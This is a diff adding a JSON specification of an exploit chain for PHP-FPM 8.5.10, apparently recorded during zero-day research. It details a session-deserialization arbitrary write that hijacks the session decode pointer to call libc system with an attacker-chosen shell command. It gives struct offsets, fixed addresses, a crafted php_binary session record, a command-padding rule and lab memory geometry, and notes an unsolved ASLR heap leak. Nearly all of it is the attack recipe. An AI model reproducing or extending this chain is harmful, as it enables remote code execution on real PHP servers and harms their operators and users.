@@ -1,0 +1,157 @@
+{
+  "name": "g2-fpm-8510-plain",
+  "lane": "fpm",
+  "stage": "G2",
+  "status": "confirmed on the lab build; ASLR off; not a universal exploit",
+  "php_version": "8.5.10",
+  "binary": "/home/davide/ailocal/php/zerodays_1020/build_plainpie/sapi/fpm/php-fpm",
+  "build_id": "3d459b79bdd7d0fb8181e21fec72783062e6f6d9",
+  "elf_type": "EXEC",
+  "pie": false,
+  "image_base": "0x400000",
+  "serializer": "php_binary",
+  "structs": {
+    "ps_serializer_size": 24,
+    "ps_serializer_name": 0,
+    "ps_serializer_encode": 8,
+    "ps_serializer_decode": 16,
+    "ps_globals_serializer": "0x160",
+    "php_unserialize_data_size": 8216,
+    "php_unserialize_data_last": 0,
+    "php_unserialize_data_first_dtor": 8,
+    "php_unserialize_data_last_dtor": 16,
+    "php_unserialize_data_max_depth": 48,
+    "php_unserialize_data_entries": 56,
+    "var_dtor_entries_size": 4096,
+    "var_dtor_entries_used_slots": 0,
+    "var_dtor_entries_next": 8,
+    "var_dtor_entries_data": 16,
+    "var_entries_max": 1018,
+    "var_dtor_entries_max": 255
+  },
+  "ps_serializers": {
+    "table": "0x14c1b20",
+    "terminator": "0x14c1b68",
+    "active_serializer_slot": "0x14c6160",
+    "active_serializer_ps_globals_offset": "0x160",
+    "default_target": "0x14c1b60",
+    "entries": [
+      {
+        "index": 0,
+        "name": "php_serialize",
+        "name_addr": "0x14c1b20",
+        "encode": "0x14c1b28",
+        "decode": "0x14c1b30",
+        "decode_16b_aligned": true
+      },
+      {
+        "index": 1,
+        "name": "php",
+        "name_addr": "0x14c1b38",
+        "encode": "0x14c1b40",
+        "decode": "0x14c1b48",
+        "decode_16b_aligned": false
+      },
+      {
+        "index": 2,
+        "name": "php_binary",
+        "name_addr": "0x14c1b50",
+        "encode": "0x14c1b58",
+        "decode": "0x14c1b60",
+        "decode_16b_aligned": true
+      }
+    ]
+  },
+  "decode_call": {
+    "php_session_decode": "0x83db0f",
+    "set_len": "0x83db57",
+    "set_val": "0x83db5b",
+    "load_serializer": "0x83db5f",
+    "call_indirect": "0x83db66",
+    "call_form": "call *0x10(%rax)",
+    "rdi": "ZSTR_VAL session record",
+    "rsi": "ZSTR_LEN session record",
+    "note": "the decode pointer is read from ps_globals+0x160 on every decode, so the write is consumed by the forced END update in the same request"
+  },
+  "pre_rinit_path": {
+    "php_session_rfc1867_update": "0x841687",
+    "php_session_initialize": "0x83fed3",
+    "initialize_call": "0x8416cc",
+    "php_session_flush": "0x840cfb",
+    "flush_call": "0x8416e9",
+    "second_decode": "multipart END forces update(progress, 1), then initialize and flush run again before RINIT; php_session_normalize_vars zeroes the type words at target+8 and target+24"
+  },
+  "write": {
+    "slot_formula": "slot = b0 + 0x10 + 16 * used_slots",
+    "used_slots_formula": "(target - (b0 + 0x10)) / 16",
+    "bound": "only used_slots + num > 255 rejects; negative used_slots pass",
+    "second_slot": "target + 16",
+    "type_zero_offsets": ["target + 8", "target + 24"],
+    "value_form": "i:<n>; parses an IS_LONG zval, so the written pointer is an arbitrary 64 bit value",
+    "alignment": "target must be 16 byte aligned; ps_serializers[1].decode at 0x14c1b48 is not"
+  },
+  "record": {
+    "format": "php_binary",
+    "x_mapping": "file byte i maps to ZSTR_VAL + i; ZSTR_VAL = X + 24",
+    "rec1": "[0x20][32 byte command][i:<n>;]",
+    "rec2": "[0x01]['z']s:<L>:\"<payload>\";",
+    "command_rule": "the 0x20 key length byte is the leading space of the shell command; the command is padded to 32 bytes and must end in # so the value text is commented out",
+    "fake_p": {
+      "last": "P + 56",
+      "first_dtor": "B0",
+      "last_dtor": "B0",
+      "max_depth": "0x7fffffff",
+      "entries_used_slots": 1018,
+      "bytes_written": 72
+    },
+    "fake_b0": {
+      "used_slots": "used_slots",
+      "next": 0,
+      "bytes_written": 16
+    },
+    "lab_geometry": {
+      "X": "0x7ffff7a6a000",
+      "P": "0x7ffff7a81000",
+      "B0": "0x7ffff7a84000",
+      "total": 131014,
+      "rec1_len": 51,
+      "L": 130949,
+      "payload_start": 63,
+      "p_off": 94184,
+      "b_off": 106472,
+      "used_slots": -8796082913867
+    }
+  },
+  "libc": {
+    "system_offset": "0x53090",
+    "note": "lab glibc build only; the offset is build and mapping specific; the binary imports no system symbol, only popen, execvp, fork and posix_spawn PLT entries",
+    "lab_base": "0x7ffff7c9c000"
+  },
+  "heap_leak": {
+    "status": "F14 pending",
+    "measured_relation": "B0 = K_dest1 - 0x9000 on the fpmboot body with ASLR off; K_dest1 is a fixed body layout constant, so this is not an ASLR capable leak",
+    "note": "a heap leak from a static session file that works under ASLR is not solved; the G2 plan needs operator supplied X, P and B0"
+  },
+  "prerequisites": [
+    "non PIE target so the ps_serializers table is at a fixed address, or a binary base leak",
+    "libc base for system, or a fixed call target that accepts (char *, size_t); the fixed target route is not demonstrated",
+    "heap addresses X, P and B0 and the exact record length",
+    "upload progress enabled with the forced END update in the same request",
+    "the plant request must be the immediately preceding request on the same worker",
+    "single shot per plant: RINIT resets BG(unserialize), and the corrupted decode pointer persists until worker restart"
+  ],
+  "receipts": {
+    "G2": "/tmp/opencode/research/fpmgadget_20261021T211940Z",
+    "F8": "/tmp/opencode/research/fpmzend_20261021T203659Z",
+    "F11": "/tmp/opencode/research/fpmsurvive_20261021T211316Z",
+    "F5": "/tmp/opencode/research/fpmwrite_20261021T201018Z",
+    "G3": "/tmp/opencode/research/htdtor_20261021T214428Z",
+    "F14": "/tmp/opencode/research/fpmboot_20261021T214637Z"
+  },
+  "caveats": [
+    "measured with setarch x86_64 -R; with ASLR on X, P, B0 and the libc base move",
+    "the fake P and fake B0 must both fall inside the session record buffer; a wrong X either leaves the plant chain in place or crashes var_push",
+    "a wrong record length moves the second decode buffer and can crash the second decode",
+    "no claim is made for other session savers, opcache, ZTS or shared pools"
+  ]
+}
